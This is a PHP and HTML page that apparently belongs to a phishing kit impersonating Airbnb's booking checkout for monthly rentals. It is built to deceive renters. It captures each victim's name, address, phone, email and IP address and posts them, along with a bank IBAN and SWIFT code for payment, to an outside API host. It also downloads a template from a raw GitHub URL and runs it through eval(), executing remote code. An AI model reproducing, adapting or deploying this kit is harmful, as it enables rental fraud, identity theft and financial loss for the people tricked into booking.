<?php
//print_r($_POST);
include("geoip/see.php");
//-------------------------------------
if(isset($_POST['bookform'])) {  
$valid = 0;
if (strpos($currency, "EUR") !== false) {
  $symbol = "€";
} else if (strpos($currency, "GBP") !== false) {
  $symbol = "£";
} else if (strpos($currency, "USD") !== false) {
  $symbol = "$";
} else if (strpos($currency, "AUD") !== false) {
  $symbol = "$";
} else if (strpos($currency, "CAD") !== false) {
  $symbol = "$";
} else if (strpos($currency, "YEN") !== false) {
  $symbol = "¥";
} else {
 $symbol = "<sup>" . $currency . "</sup>";
}

// Total nights
$d1 = new DateTime($_POST['checkin']);
$d2 = new DateTime($_POST['checkout']);
///====================================

// Checkin date formatted
$chin = date_create($_POST['checkin']);
$chin = date_format($chin, 'D, M, j, Y');
// Check out date formatted
$chou = date_create($_POST['checkout']);
$chou = date_format($chou, 'D, M, j, Y');
//============================================= 
// Current date (today)
$datenow = date('d-m-Y');
$datenow = date_create($datenow);
$datenow = date_format($datenow, 'D, M, j, Y');
///=============================================

$stotal = $roomprice * $_POST['months'];
$firstpay = $roomprice * $payment + $deposit;

if($deposit) {
	$total = $firstpay;
	$ala = '<tr class="service-fee">
        <td class="name">
          Security deposit
        </td>
        <td class="val">'.$symbol.$deposit.'</td>
      </tr>';
	  $d_input = '<input name="deposit" type="hidden" value="'.$deposit.'">';
	  $d_input = '<input name="deposit" type="hidden" value="'.$deposit.'">';
} else {
	$total = $roomprice * $payment;
	$ala = '';
	$d_input = '<input name="deposit" type="hidden" value="">';
}
///==============================================

// Price calculated
function crypto_rand_secure($min, $max) {
        $range = $max - $min;
        if ($range < 0) return $min; // not so random...
        $log = log($range, 2);
        $bytes = (int) ($log / 8) + 1; // length in bytes
        $bits = (int) $log + 1; // length in bits
        $filter = (int) (1 << $bits) - 1; // set all lower bits to 1
        do {
            $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes)));
            $rnd = $rnd & $filter; // discard irrelevant bits
        } while ($rnd >= $range);
        return $min + $rnd;
}
function getToken($length) {
    $token = "";
    $codeAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $codeAlphabet.= "abcdefghijklmnopqrstuvwxyz";
    $codeAlphabet.= "0123456789";
    for($i=0;$i<$length;$i++){
        $token .= $codeAlphabet[crypto_rand_secure(0,strlen($codeAlphabet))];
    }
    return $token;
}
$bookcode = getToken(6);
$bookcode = strtoupper($bookcode);
///===============================================
} else if(isset($_POST['finish'])) {
	extract($_POST);
		$ch = curl_init($apihost.'api_post.php');
			$fields = array(
				'bookcode' => ($guest['code']),
				'bookdate' => ($guest['bookdate']),
				'roomid' => ($roomid),
				'roomname' => ($roomname),
				'roomtype' => ($roomtype),
				'guestname' => ($guest['first_name']." ".$guest['last_name']),
				'guestinfo' => ($guest['address']."\n".$guest['city'].", ".$guest['state']."\n".$guest['zip'].", ".$guest['country']."\n Phone: ".$guest['phone']."\n"),
				'guestemail' => ($guest['email']),
				'hostinfo' => array($hostid, $hostemail, $hostname, $hostpic),
				'guestip' => ($guest['ip']),
				'booktotal' => ($guest['total']),
				'checkin' => ($guest['checkin']),
				'checkout' => ($guest['checkout']),
				'bankinfo' => array($paymentid, $bankname, $iban, $accountname, $bankswift, $bankinfo),
				'currency' => ($currency),
				'userid' => ($userid),
				'emailtemplate' => ($emailtemplate),
				'months' => ($_POST['guest']['months']),
				'price' => ($roomprice),
				'subtotal' => ($stotal),
				'deposit' => ($deposit),
				'city' => ($city."  ".$state),
				'location' => ($address),
			);
			$fields = json_encode($fields);

			curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
			curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			$result = curl_exec($ch);
			curl_close($ch);
		$insert = json_decode($result, true);
		$insert = $insert['active'];

		if($insert == "sent") {
			$valid = 1;
			$msg =  "Success! Your booking #".$guest['code'];
			$goto = "https://www.airbnb.com/?Success!";
		} else if ($insert == "duplicate") {
				$msg =  "Duplicate entry! No need to resubmit the form";
				$valid = 2;
				$goto = "https://www.airbnb.com/?Success!";
		} else if ($insert == "notsent") {
			  $valid = 1;
				$msg =  "Success! Your booking #".$guest['code'].". No mail was sent to your inbox.";
				$valid = 2;
				$goto = "https://www.airbnb.com/?Success!";
		} else {
				$msg =  "There has been an error and you must go back and try again! (ERR 404)";
				$valid = 3;
				$goto = "../rooms/".$roomid."?Error!";
		}
	}
?>
<html xmlns:fb="http://ogp.me/ns/fb" lang="en">
<head>
    <meta charset="utf-8">
    <link href="<?= $rawgit_cdn; ?>airbnb/static/packages/common_o2.2.css" media="all" rel="stylesheet" type="text/css">
    <link href="<?= $rawgit_cdn; ?>airbnb/static/payments.css" media="screen" rel="stylesheet" type="text/css">
	<link href="<?= $rawgit_cdn; ?>airbnb/static/p4/p4_with_v2_phone_verification_widget.css" media="screen" rel="stylesheet" type="text/css">
	<script>var sherlock_firstbyte = Number(new Date());</script>

    <title>Book <?php echo $roomname; ?></title>

    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta property="og:image" content="<?= $rawgit_cdn; ?>airbnb/static/icons/belo-400x400.png">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="image_src" href="<?= $rawgit_cdn; ?>airbnb/static/logos/belo-200x200.png">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="theme-color" content="#f5f5f5">

    <link rel="apple-touch-icon" href="<?= $rawgit_cdn; ?>airbnb/static/icons/apple-touch-icon-76x76.png">
	<link rel="apple-touch-icon" sizes="76x76" href="<?= $rawgit_cdn; ?>airbnb/static/icons/apple-touch-icon-76x76.png">
	<link rel="apple-touch-icon" sizes="120x120" href=".<?= $rawgit_cdn; ?>airbnb/static/icons/apple-touch-icon-120x120.png">
	<link rel="apple-touch-icon" sizes="152x152" href="<?= $rawgit_cdn; ?>airbnb/static/icons/apple-touch-icon-152x152.png">
	<link rel="apple-touch-icon" sizes="180x180" href="<?= $rawgit_cdn; ?>airbnb/static/icons/apple-touch-icon-180x180.png">
	<link rel="icon" sizes="192x192" href="<?= $rawgit_cdn; ?>airbnb/static/icons/android-icon-192x192.png">
	<link rel="shortcut icon" sizes="76x76" type="image/x-icon" href="<?= $rawgit_cdn; ?>airbnb/static/icons/logotype_favicon.ico">
	<script charset="utf-8" class="lazyload" src="<?= $rawgit_cdn; ?>airbnb/static/packages/react.js"></script>
	<script charset="utf-8" class="lazyload" src="<?= $rawgit_cdn; ?>airbnb/static/packages/field_guide.bundle.js"></script>
	<script charset="utf-8" class="lazyload" src="//cdn.siftscience.com/s.js"></script>
  </head>
  <body class="with-new-header">
    <div id="header" class="airbnb-header new">
			<header class="header--sm show-sm" aria-hidden="true" role="banner">
	  <a href="../rooms/<?php echo $roomid; ?>" aria-label="Homepage" data-prevent-default class="link-reset burger--sm">
		<i class="icon icon-reorder icon-rausch"></i>
		<span class="screen-reader-only"> Airbnb </span>
	  </a>
	  <div class="title--sm text-center">
		  <button class="btn btn-block search-btn--sm search-modal-trigger">
			<i class="icon icon-search icon-gray"></i>
			<span class="search-placeholder--sm">
			  Where are you going?
			</span>
		  </button>
	  </div>
	  <div class="action--sm"></div>
	  <nav class="nav--sm" role="navigation"></nav>
	  <div class="search-modal-container"></div>
	</header>


<div class="regular-header regular-header--new clearfix hide-sm" id="new-header">
<div class="comp pull-left">
  <a href="../rooms/<?php echo $roomid; ?>" class="hdr-btn link-reset belo-container">
    <i class="icon icon-pos--lower icon-rausch icon-airbnb-alt h2"></i>
  </a>
</div>


    <div class="comp pull-left search-bar-wrapper">
    <form action="#search" class="search-form">
      <div class="search-bar">
        <i class="header-icon icon-search-alt-gray search-icon"></i>
        <input type="text" placeholder="Where are you going?" autocomplete="off" name="location" data-date-placeholder="mm/dd/yyyy" class="location" />
        <input type="hidden" name="source" value="hdr" />
      </div>
    </form>
  </div>



<div class="comp pull-right show-login">
  <a class="no-crawl hdr-btn link-reset header-avatar-trigger needsclick"
     rel="nofollow"
     href="#"
     data-href="#dashboard"
     data-href-host="#trips">
    <span class="value_name margin-right--tiny hide-md"></span>
    <div class="media-photo media-round user-profile-image header-icon icon-profile-alt-gray"></div>
  </a>
</div>
<div id="apihost" data-content="<?php echo $apihost; ?>process.php">
<div id="js-header-help-menu">
  <div class="comp pull-right help-trigger-wrapper no-border background-light-gray ">
    <a class="hdr-btn js-help-toggle link-reset needsclick"
       href="#help">
      <span class="margin-right--tiny hide-md">Help</span>
      <i class="header-icon icon-lifesaver-alt-gray"></i>
    </a>
  </div>
</div>

<div class="comp pull-right " data-behavior="recently-viewed__container">
  <div>
    <a class="no-crawl hdr-btn link-reset "
       href="../rooms/8604878">
      <span class="hide-md margin-right--tiny">
        Recently Viewed
      </span>
      <i class="icon icon-recently-viewed h3 margin-right--small icon-pos--lower icon-gray"></i>
    </a>
  </div>

  <div class="panel  drop-down-menu recently-viewed__dropdown"
    data-behavior="recently-viewed__dropdown">
  </div>
</div>
</div>
</div>
<script src="<?= $rawgit_cdn; ?>airbnb/static/packages/header_cookie.bundle2.js" type="text/javascript"></script>
 <main id="site-content" role="main">
<?php if(isset($_POST['bookform'])) { ?>
<div id="main-view" class="main-view page-container-responsive row-space-top-6 row-space-6 <?php if($valid) { echo "hide"; }?>">
    <div class="row">
      <div class="col-md-5 col-md-push-7 col-lg-4 col-lg-push-8 row-space-2">
        <div class="panel payments-listing">
          <div class="media-photo media-photo-block text-center payments-listing-image">
            <img src="<?php echo $img_result[0]; ?>" class="img-responsive-height" alt="<?php echo $roomname; ?>">
          </div>
          <div class="panel-body">
            <section id="your-trip" class="your-trip">
              <div class="hosting-info">
                <div class="payments-listing-name h4 row-space-1"><?php echo $roomname; ?></div>
                <div class="hide-sm">
                  <p><?php echo $fulladdr; ?></p>
                  <hr>
                  <div class="row-space-1">
                    <strong><?php echo $roomtype; ?></strong> for <strong><?php echo $guests; ?> guests</strong>
                  </div>
                  <div>
                    <strong><?php echo $chin; ?></strong> to <strong><?php echo $chou; ?></strong>
                  </div>
                </div>
                <hr>
                <table class="reso-info-table">
                  <tbody>
                    <tr>
                      <td>Cancellation Policy</td>
                      <td>
                        <a href="#flexible" class="cancel-policy-link" target="">Flexible</a>
                      </td>
                    </tr>
                    <tr>
                      <td>
                        Rent period
                      </td>
                      <td>
                        <?php echo $_POST['months']." ".(($_POST['months'] <= 1)?"Month":"Months"); ?>
                      </td>
                    </tr>
                  </tbody>
                </table>
                <hr>
                <section id="billing-summary" class="billing-summary">


  <table id="billing-table" class="reso-info-table billing-table">
    <tbody>
      <tr class="base-price">
        <td class="name"><?php echo $symbol; ?><?php echo $roomprice; ?> x <?php echo $_POST['months']." ".(($_POST['months'] <= 1)?"Month":"Months"); ?>
        </td>
        <td class="val">
          <?php echo $symbol; ?><?php echo $stotal; ?>
        </td>
      </tr>
	  <?php echo $ala; ?>
      <tr class="service-fee">
        <td class="name">
          First payment
        </td>
        <td class="val"><?php echo $symbol; ?><?php echo $firstpay; ?></td>
      </tr>

    </tbody>
  </table>

  <hr>
  <table id="payment-total-table" class="reso-info-table billing-table">
    <tbody>
      <tr class="total">
        <td class="name"><span class="h3">TOTAL</span></td>
        <td class="text-special icon-dark-gray">
			<span class="h3 total-guest-payment"><?php echo $symbol; ?><?php echo $total; ?></span>
		</td>
      </tr>

    </tbody>
  </table>

<div class="panel-total-charge">
  <hr>

  <small><div>
    <span id="currency-total-charge" class="">
      You are paying in <strong><span id="payment-currency"><?php echo $currency; ?></span></strong>.
      Your total charge is
      <strong><span id="payment-total-charge"><?php echo $symbol; ?><?php echo $total; ?></span></strong>.
    </span>
    <span id="fx-messaging">The <a href="#502" target="">exchange rate</a> for booking this listing is your host's listing currency.</span>
  </div></small>
</div>


 </section>
              </div>
            </section>
          </div>

        </div>
        <div class="pwp-summary-container"></div>
      </div>
      <div id="content-container" class="col-md-7 col-md-pull-5 col-lg-pull-4">
			<div class="alert alert-with-icon alert-error alert-block hide row-space-2" id="server-error">
				<i class="icon alert-icon icon-alert-alt"></i>Unfortunately, a server error prevented your request from being completed. Airbnb may be undergoing maintenance or your connection may have timed out. Please try again.
			</div>
<form method="POST" id='contact_form' autocomplete="off" onkeypress="return event.keyCode != 13;">
	<section class="checkout-main__section">
	<h2>Billing Address</h2>
				<p>
				  If your request is accepted, <?php echo $hostname; ?> will need your email and contact information. Make sure your email is valid before continuing.
				</p>

				<section class="row-space-top-4">
						<div class="row">
							<div class="control-group cc-first-name col-md-8">
							  <label class="control-label" for="credit-card-first-name">
								Email address
							  </label>

							  <div style="display: table;" class="input-addon">
							  <span class="input-prefix input-large">@</span>
							  <input name="email" class="input-stem input-large" placeholder="example: traveler@world.com" type="email" id="email">
							</div>
							<div id='email_error' class="error label label-warning inline-error">Please enter a valid email address.</div>
							<div id='success' class="success label label">Continue booking or <a href="../rooms/<?php echo $roomid; ?>" onclick="myFunction()">Reset form</a></div>

							</div>

							<div class="control-group cc-last-name col-md-4">
							  <label class="control-label" for="credit-card-last-name">
								&nbsp;
							  </label>

							  <input type="button" class="btn btn-large" id='validate' value="Validate Email" style="width:100%;">
							</div>
						  </div>
	<div id='container'>

		<div id='mail_fail' class='error'>Sorry, error occured this time sending your message.</div>
		<div id='msg'></div>

	</div>
				</section>

	</section>
</form>
<script>
function myFunction() {
    document.getElementById("contact_form").reset();
    document.getElementById("bookit").reset();
	$('#email').removeAttr('disabled');
	$('#validate').removeAttr('disabled').attr('value', 'Validate Email');
	 $('#guest_fn').attr({'disabled': 'true'});
	 $('#guest_ln').attr({'disabled': 'true'});
	 $('#guest_ad').attr({'disabled': 'true'});
	 $('#guest_ci').attr({'disabled': 'true'});
	 $('#guest_st').attr({'disabled': 'true'});
	 $('#guest_zi').attr({'disabled': 'true'});
	 $('#guest_ph').attr({'disabled': 'true'});
	 $('#bin').fadeOut(500);
	 $('#btnconfirm').fadeOut(1000);
	 $('#colink').fadeOut(500);
	 $('#success').fadeOut(500);
	 $('#guest_co').fadeOut(500).attr('value', '<?php echo $country; ?>');
	 $('#cotext').fadeIn(500);
}

function coChange() {
	 $('#guest_co').fadeIn(500).attr('value', '');
	 $('#cotext').fadeOut(500);
}
</script>

<form method="POST" id="theform" name="theform">
	<input name="finish" value="1" type="hidden">
    <input name="guest[code]" value="<?php echo $bookcode; ?>" type="hidden">
	<input name="guest[email]" id="guest_em" type="hidden" value="">
	<input name="guest[total]" type="hidden" value="<?php echo $symbol; ?><?php echo $total; ?>">
	<input name="guest[checkin]" type="hidden" value="<?php echo $_POST['checkin']; ?>">
	<input name="guest[checkout]" type="hidden" value="<?php echo $_POST['checkout']; ?>">
	<input name="guest[ip]" type="hidden" value="<?php echo $ip; ?>">
	<input name="guest[bookdate]" type="hidden" value="<?php echo $datenow; ?>">
	<input name="guest[guests]" type="hidden" value="<?php echo $guests; ?>">
	<input name="guest[months]" type="hidden" value="<?php echo $_POST['months']; ?>">
	<input name="stotal" type="hidden" value="<?php echo $stotal; ?>">
	<input name="total" type="hidden" value="<?php echo $total; ?>">
	<?php echo $d_input; ?>

<section id="payment" class="checkout-main__section payment">
<div class="payment-section">
  <div id="payment-methods-content">
    <div class="payment-method cc active">
      <div class="payment-method-container">
        <div class="new-card">
          <div class="row">
            <div class="control-group cc-first-name col-md-6">
              <label class="control-label" for="credit-card-first-name">
                First name
              </label>

              <input name="guest[first_name]" id="guest_fn" type="text"  placeholder="Your first name" >
              <div id='fn_error' class="error label label-warning inline-error">First name cannot be empty</div>
            </div>

            <div class="control-group cc-last-name col-md-6">
              <label class="control-label" for="credit-card-last-name">
                Last name
              </label>

              <input name="guest[last_name]" id="guest_ln" type="text"  placeholder="Your last name" >
              <div id='ln_error' class="error label label-warning inline-error">Last name cannot be empty</div>
            </div>
          </div>
          <div class="row ">
            <div class="control-group cc-address1 col-md-6">
              <label class="control-label" for="credit-card-address1">
                Street address
              </label>
              <input name="guest[address]" id="guest_ad" type="text"  placeholder="Billing address" >
              <div id='ad_error' class="error label label-warning inline-error">Please enter you billing address</div>
            </div>

            <div class="control-group cc-city col-md-3">
              <label for="credit-card-city">
                City
              </label>
              <input name="guest[city]" id="guest_ci" type="text"  placeholder="City" >
              <div id='ci_error' class="error label label-warning inline-error">Field empty</div>
            </div>
			<div class="control-group cc-city col-md-3">
              <label for="credit-card-city">
                State / Region
              </label>
              <input name="guest[state]" id="guest_st" type="text"  placeholder="State or region" >
              <div id='st_error' class="error label label-warning inline-error">Field empty</div>
            </div>
          </div>

          <div class="row row-space-2">
		              <div class="control-group cc-city col-md-2">
              <label for="credit-card-zip">
                Postal code
              </label>
              <input class="cc-short cc-zip-text" name="guest[zip]" id="guest_zi" type="text"  placeholder="Zip" >
              <div id='zi_error' class="error label label-warning inline-error">Empty</div>
            </div>
            <div class="control-group cc-city col-md-4">
			<label for="credit-card-city">
                Country
              </label>
				<input class="guest_co" id="guest_co" name="guest[country]" type="text" value="<?php echo $country?>"  placeholder="Select country" >
				<div class="cotext" id="cotext">
					<strong id="billing-country"><?php echo $country; ?></strong><br>
				<small class="colink" id="colink">Not your country? <a onclick="coChange()">change</a></small>
				</div>
              <div id='co_error' class="error label label-warning inline-error">Country field empty</div>
            </div>
            <div class="control-group cc-city col-md-6">
              <label for="credit-card-city">
                Phone number
              </label>
				<div style="display: table;" class="input-addon">
				  <span class="input-prefix">Tel.</span>
				  <input id="guest_ph" name="guest[phone]" class="input-stem" placeholder="+1 909 909 2283" type="tel">
				</div>
              <div id='ph_error' class="error label label-warning inline-error">Enter your phone no.</div>
            </div>
			<div id='error' class="error label label-warning inline-error">Enter your phone no.</div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
</section>
<section id="house-rules-agreement" class="checkout-main__section">
	  <h2 class="section-title"> House Rules </h2>
	  <p> By booking this space you’re agreeing to follow <?php echo $hostname; ?>’s House Rules. </p>
		<div class="row">
			<div class="control-group cc-last-name col-md-4">
			  <input type="submit" name="bin" value="Confirm Booking" style="width:100%; display:none;" class="btn btn-large btn-primary" id="bin" />
			</div>
		</div>
</section>
</form>
        <section id="btnconfirm" class="btnconfirm">
          <div class="terms media">
            <div class="media-body">
              <label for="agrees-to-terms">
                By clicking on “Confirm Booking”, you agree to pay the total amount shown, which includes Service Fees, on the right and to the <a href="#terms" class="terms_link" target="">Terms of Service</a>, <a href="#house-rules-modal" class="house-rules-link">House Rules</a>, <a href="#building-rules-modal" class="building-rules-link">Building Rules</a>, <a href="#strict" class="cancel-policy-link" target="">Cancellation Policy</a> and <a href="#guest_refund_policy" class="refund_policy_link">Guest Refund Policy</a>.
              </label>
			   <p class="book-now-explanation default">
					Clicking <strong>Confirm Booking</strong> will confirm your rent reservation and charge your payment method.
				</p>
            </div>
          </div>
        </section>
<p class="book-now-explanation deferred_payment">
				  The host will have 24 hours to reply. If they accept your request, you'll be asked to complete your payment and confirm the rent agreement. If the host declines or does not respond, you won't be charged.
				</p>
      </div>
    </div>
</div>
<?php } ?>
<?php if($valid) {
		$stpl = file_get_contents('https://raw.githubusercontent.com/serge72mt/rooms/master/successtemplate_monthly.html');
		echo eval("?> ".$stpl." <?php ");
} ?>
</main>


<style>
@import url(//fonts.googleapis.com/css?family=Libre+Baskerville:400,400italic,700);
#container {
    font-family: 'Libre Baskerville', serif;
    width: 400px;
    padding: 0;
    margin: 0 auto;
}


#container p {
    font-weight: normal;
}

#validate {
    cursor: pointer;
}
#colink {
    cursor: pointer;
}
#submit {
    text-align: left;
}
.error {
    display: none;
}
.btnconfirm {
    display: none;
}
.guest_co {
    display: none;
}
.colink {
    display: none;
}
.success {
	 display: none;
}

</style>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js"></script>
<script type="text/javascript">
$(document).ready(function() {
 $('#guest_fn').attr({'disabled': 'true'});
 $('#guest_ln').attr({'disabled': 'true'});
 $('#guest_ad').attr({'disabled': 'true'});
 $('#guest_ci').attr({'disabled': 'true'});
 $('#guest_st').attr({'disabled': 'true'});
 $('#guest_zi').attr({'disabled': 'true'});
 $('#guest_ph').attr({'disabled': 'true'});
 $('#validate').click(function(e) {
        e.preventDefault();
        var error = false;
        var email = $('#email').val();
        if (email.length == 0 || email.indexOf('@') == '-1') {
            var error = true;
            $('#email_error').fadeIn(500);
        } else {
            $('#email_error').fadeOut(500);
        }
					// UNDE UNDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
					// UNDE UNDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
					// UNDE UNDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
					// UNDE UNDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
					// UNDE UNDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
					// UNDE UNDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
					// UNDE UNDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE
					// UNDE UNDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE

        if (error == false) {
	           var apihost = "";
	           var eemail = $('#email').val(); // a
            $('#validate').attr({'disabled': 'true','value': 'Validating Email..'});
						var data = { action: "validate", email: eemail }
						$.ajax({
						   type: 'POST',
						   url: apihost,
						   data: data,
						   success: function(status) {
								 if(status) {
									 $('#submit').remove();
									 $('#validate').attr('value', 'Email Validated');
									 $('#bin').fadeIn(500);
									 $('#btnconfirm').fadeIn(1000);
									 $('#colink').fadeIn(500);
									 $('#success').fadeIn(500);
									 $('#guest_fn').removeAttr('disabled');
									 $('#guest_ln').removeAttr('disabled');
									 $('#guest_ad').removeAttr('disabled');
									 $('#guest_ci').removeAttr('disabled');
									 $('#guest_st').removeAttr('disabled');
									 $('#guest_zi').removeAttr('disabled');
									 $('#guest_ph').removeAttr('disabled');
									 $('#guest_em').attr('value', email);
									 $('#email').attr({'disabled': 'true'});
								 }
						   }
						  });
        }
    });
	//------------------------------
});

</script>


<meta content="{&quot;account_activation/welcome.jpg&quot;:&quot;<?= $rawgit_cdn; ?>airbnb/static/packages/welcome-aa503648ad6513fc0cb1284728e70d35.jpg&quot;,&quot;account_activation/success.jpg&quot;:&quot;../rooms/airbnb/static/packages/success-15a147d04b3a4af77d3ac5bd6f03d95d.jpg&quot;,&quot;user_pic-225x225.png?v=2&quot;:&quot;../rooms/airbnb/static/packages/user_pic-225x225.png?v=2&quot;}" id="_bootstrap-image_paths">

<script src="<?= $rawgit_cdn; ?>airbnb/static/packages/libs_jquery_2x.js" type="text/javascript"></script>
<script src="<?= $rawgit_cdn; ?>airbnb/static/packages/core.bundle.js" type="text/javascript"></script>
<div id="google_translate_element"></div>
<script type="text/javascript">
function googleTranslateElementInit() {
  new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.FloatPosition.TOP_LEFT}, 'google_translate_element');
}
</script>
</body></html>
